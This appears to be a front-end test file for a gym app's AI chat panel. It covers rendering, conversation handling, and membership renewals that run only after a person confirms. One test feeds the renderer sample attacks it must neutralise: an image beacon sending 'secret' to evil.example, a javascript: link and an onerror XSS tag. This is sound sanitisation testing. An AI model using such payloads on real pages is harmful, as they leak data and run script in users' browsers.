import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { renderWithApp, resetApiForTests } from "@/test/harness";
import type { MockGymOSApi } from "@/lib/mock/MockGymOSApi";
import { AskRivetProvider, useAskRivetScreen } from "./ask-rivet-context";
import { AskRivetPanel } from "./ask-rivet-panel";
import { AskRivetLauncher } from "./launcher";
import { StreamingMarkdown } from "./markdown";

vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn(), replace: vi.fn(), prefetch: vi.fn() }), useParams: () => ({}), usePathname: () => "/members/m-1", useSearchParams: () => new URLSearchParams() }));

beforeEach(() => {
  vi.stubGlobal("ResizeObserver", class { observe() {} unobserve() {} disconnect() {} });
  // A wide desktop: the window floats in the corner, large enough for the conversation list.
  vi.stubGlobal("matchMedia", (query: string) => ({ matches: /min-width/.test(query), media: query, addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {}, onchange: null, dispatchEvent: () => false }));
  vi.stubGlobal("requestAnimationFrame", (callback: FrameRequestCallback) => window.setTimeout(() => callback(performance.now()), 0));
  vi.stubGlobal("cancelAnimationFrame", (id: number) => window.clearTimeout(id));
});

afterEach(() => {
  resetApiForTests();
  vi.unstubAllGlobals();
});

describe("answers are rendered as untrusted text", () => {
  it("turns RIVET record links into chips and refuses everything else that could leak or run", () => {
    render(<StreamingMarkdown streaming={false} text={[
      "Call [Ahmad Khalil](rivet://member/m-1) and [Rana](rivet://lead/l-2).",
      "",
      "![tracking](https://evil.example/pixel.png?d=secret) [click](javascript:alert(1)) [site](http://plain.example) <img src=x onerror=alert(1)>",
      "",
      "> Hi Ahmad, your membership ends Friday.",
      "",
      "| Member | Owes |",
      "| --- | ---: |",
      "| Ahmad | JOD 25.000 |",
    ].join("\n")} />);
    const records = screen.getAllByTestId("ask-record-link");
    expect(records.map((link) => link.getAttribute("href"))).toEqual(["/members/m-1", "/crm/leads/l-2"]);
    expect(document.querySelector("img")).toBeNull();
    expect(screen.queryByRole("link", { name: "click" })).toBeNull();
    expect(screen.queryByRole("link", { name: "site" })).toBeNull();
    expect(screen.getByText("click")).toBeInTheDocument();
    expect(document.body.innerHTML).not.toContain("onerror");
    expect(screen.getByTestId("ask-draft")).toHaveTextContent("your membership ends Friday");
    expect(within(screen.getByTestId("ask-draft")).getByRole("button", { name: "Copy" })).toBeInTheDocument();
    expect(screen.getByRole("table")).toHaveTextContent("JOD 25.000");
  });

  it("closes half-written syntax in the block still being written", () => {
    render(<StreamingMarkdown streaming text={"Done.\n\nThis is **importa"} />);
    expect(screen.getByText("importa").tagName).toBe("STRONG");
    expect(document.body.textContent).not.toContain("**");
  });
});

function MemberScreen() {
  useAskRivetScreen({ title: "Omar Haddad", focus: { kind: "member", id: "m-1", label: "Omar Haddad" }, suggestions: [{ kind: "member_payments", id: "m-1", label: "Payments" }], prompts: ["Brief me before I call Omar"] });
  return null;
}

function Shell() {
  return <AskRivetProvider><MemberScreen /><AskRivetLauncher /><AskRivetPanel /></AskRivetProvider>;
}

async function makeAvailable(api: MockGymOSApi, capabilities: Record<string, "off" | "prepare" | "execute"> = {}) {
  const session = await api.getSession();
  await api.setPlatformAiAvailability({ organizationId: session.organization.id, available: true, reason: "Test gym" });
  const settings = await api.getAiSettings();
  await api.updateAiSettings({ tenantMode: "execute", expectedRevision: settings.revision, capabilities });
}

describe("Wazen, the chat window (Ask RIVET in code)", () => {
  it("does not appear for a gym RIVET has not made available", async () => {
    await renderWithApp(<Shell />);
    await waitFor(() => expect(screen.queryByTestId("ask-rivet-launcher")).toBeNull());
    expect(screen.queryByTestId("ask-rivet-panel")).toBeNull();
  });

  it("does not appear when the gym turns the conversation off", async () => {
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api, { chat: "off" }) });
    await waitFor(() => expect(screen.queryByTestId("ask-rivet-launcher")).toBeNull());
  });

  it("opens with the screen's record attached, offers its lists, and answers with linked records", async () => {
    const user = userEvent.setup();
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api) });
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    const panel = screen.getByTestId("ask-rivet-panel");
    expect(panel).toHaveAttribute("data-state", "open");
    expect(within(panel).getByTestId("ask-attached")).toHaveTextContent("Omar Haddad");
    expect(within(panel).getByTestId("ask-suggestion")).toHaveTextContent("Payments");
    expect(within(panel).getByTestId("ask-test-badge")).toBeInTheDocument();

    // Adding a suggestion moves it into the message.
    await user.click(within(panel).getByTestId("ask-suggestion"));
    expect(within(panel).getByTestId("ask-attached")).toHaveTextContent("Payments");
    expect(within(panel).queryByTestId("ask-suggestion")).toBeNull();

    await user.type(within(panel).getByTestId("ask-input"), "Which members owe money?{Enter}");
    const answer = await within(panel).findByTestId("ask-answer");
    await waitFor(() => expect(answer).toHaveAttribute("data-status", "complete"), { timeout: 5_000 });
    expect(within(panel).getByTestId("ask-user-message")).toHaveTextContent("Which members owe money?");
    expect(within(panel).getByTestId("ask-user-message")).toHaveTextContent("Omar Haddad");
    await waitFor(() => expect(within(answer).getAllByTestId("ask-record-link").length).toBeGreaterThan(0));
    expect(within(answer).getByTestId("ask-worklog")).toHaveAttribute("data-state", "done");
    expect(within(answer).getByTestId("ask-screen-link")).toHaveAttribute("href", "/members?membership=outstanding");
    // The box is ready for the next question, with the screen's record attached again.
    expect(within(panel).getByTestId("ask-input")).toHaveValue("");
    expect(within(panel).getByTestId("ask-attached")).toHaveTextContent("Omar Haddad");
  });

  it("closes with Escape and from its own button", async () => {
    const user = userEvent.setup();
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api) });
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    await user.click(screen.getByTestId("ask-input"));
    await user.keyboard("{Escape}");
    expect(screen.getByTestId("ask-rivet-panel")).toHaveAttribute("data-state", "closed");
    await user.click(screen.getByTestId("ask-rivet-launcher"));
    await user.click(screen.getByTestId("ask-close"));
    expect(screen.getByTestId("ask-rivet-panel")).toHaveAttribute("data-state", "closed");
  });

  it("floats over the page instead of taking its width, and grows to show the conversation list", async () => {
    const user = userEvent.setup();
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api) });
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    const panel = screen.getByTestId("ask-rivet-panel");
    expect(panel).toHaveAttribute("data-mode", "popup");
    expect(panel).toHaveAttribute("data-size", "compact");
    expect(within(panel).queryByTestId("ask-rail")).toBeNull();
    await user.click(within(panel).getByTestId("ask-size"));
    expect(panel).toHaveAttribute("data-size", "large");
    expect(within(panel).getByTestId("ask-rail")).toBeInTheDocument();
    expect(window.localStorage.getItem("rivet.askRivet.size")).toBe("large");
    await user.click(within(panel).getByTestId("ask-size"));
    expect(panel).toHaveAttribute("data-size", "compact");
  });

  it("keeps each conversation separate: start another, then go back to the first and rename it", async () => {
    const user = userEvent.setup();
    await renderWithApp(<Shell />, { prepare: (api) => makeAvailable(api) });
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    const panel = screen.getByTestId("ask-rivet-panel");
    const ask = async (text: string) => {
      await user.type(within(panel).getByTestId("ask-input"), `${text}{Enter}`);
      await waitFor(() => expect(within(panel).getAllByTestId("ask-answer").at(-1)).toHaveAttribute("data-status", "complete"), { timeout: 5_000 });
    };
    await ask("Which members owe money?");
    await user.click(within(panel).getByTestId("ask-new"));
    expect(within(panel).queryByTestId("ask-answer")).toBeNull();
    await ask("What needs my attention today?");
    expect(within(panel).getAllByTestId("ask-user-message")).toHaveLength(1);

    await user.click(within(panel).getByTestId("ask-history"));
    const threads = await within(panel).findAllByTestId("ask-thread");
    expect(threads.map((row) => row.textContent)).toEqual([expect.stringContaining("What needs my attention today?"), expect.stringContaining("Which members owe money?")]);
    await user.click(within(threads[1]!).getAllByRole("button")[0]!);
    await waitFor(() => expect(within(panel).getByTestId("ask-user-message")).toHaveTextContent("Which members owe money?"));
    expect(within(panel).getByTestId("ask-title")).toHaveTextContent("Which members owe money?");

    await user.click(within(panel).getByTestId("ask-history"));
    await user.click(within((await within(panel).findAllByTestId("ask-thread"))[1]!).getByTestId("ask-thread-rename"));
    const name = within(panel).getByTestId("ask-thread-rename-input");
    await user.clear(name);
    await user.type(name, "Money owed{Enter}");
    await waitFor(() => expect(within(panel).getAllByTestId("ask-thread")[1]).toHaveTextContent("Money owed"));
  });
});

describe("Wazen's proposed changes", () => {
  let memberId = "";
  let memberName = "";

  function RealMember() {
    useAskRivetScreen({ title: memberName, focus: { kind: "member", id: memberId, label: memberName } });
    return null;
  }

  /** A seeded member whose latest term is active, so a renewal can chain from it. */
  async function pickMember(api: MockGymOSApi) {
    await makeAvailable(api);
    const terms = await api.listMemberships({ status: "active", pageSize: 50 });
    const term = terms.items.find((item) => !terms.items.some((other) => other.memberId === item.memberId && other.endDate > item.endDate));
    memberId = term!.memberId;
    memberName = term!.memberName;
  }

  it("shows a renewal as a card and renews only when the person confirms", async () => {
    const user = userEvent.setup();
    const { api } = await renderWithApp(<AskRivetProvider><RealMember /><AskRivetLauncher /><AskRivetPanel /></AskRivetProvider>, { prepare: pickMember });
    const before = (await api.listMemberships({ memberId, pageSize: 50 })).items.length;
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    const panel = screen.getByTestId("ask-rivet-panel");
    await user.type(within(panel).getByTestId("ask-input"), "Renew his membership{Enter}");
    const card = await within(panel).findByTestId("ask-action", {}, { timeout: 5_000 });
    expect(card).toHaveAttribute("data-kind", "renew_membership");
    expect(card).toHaveTextContent(memberName);
    expect(card).toHaveTextContent("Nothing changes until you confirm.");
    expect((await api.listMemberships({ memberId, pageSize: 50 })).items).toHaveLength(before);

    await user.click(within(card).getByTestId("ask-action-confirm"));
    await waitFor(() => expect(within(panel).getByTestId("ask-action")).toHaveAttribute("data-status", "done"));
    expect(within(panel).getByTestId("ask-action")).toHaveTextContent("Membership renewed");
    // The new term starts after the current one, so nothing is collectible today.
    expect(within(panel).queryByTestId("ask-action-collect")).toBeNull();
    expect((await api.listMemberships({ memberId, pageSize: 50 })).items).toHaveLength(before + 1);
  });

  it("changes nothing when the person says not now", async () => {
    const user = userEvent.setup();
    const { api } = await renderWithApp(<AskRivetProvider><RealMember /><AskRivetLauncher /><AskRivetPanel /></AskRivetProvider>, { prepare: pickMember });
    const before = (await api.listMemberships({ memberId, pageSize: 50 })).items.length;
    await user.click(await screen.findByTestId("ask-rivet-launcher"));
    const panel = screen.getByTestId("ask-rivet-panel");
    await user.type(within(panel).getByTestId("ask-input"), "Renew his membership{Enter}");
    const card = await within(panel).findByTestId("ask-action", {}, { timeout: 5_000 });
    await user.click(within(card).getByTestId("ask-action-dismiss"));
    await waitFor(() => expect(within(panel).getByTestId("ask-action")).toHaveAttribute("data-status", "dismissed"));
    expect(within(panel).queryByTestId("ask-action-confirm")).toBeNull();
    expect((await api.listMemberships({ memberId, pageSize: 50 })).items).toHaveLength(before);
  });
});
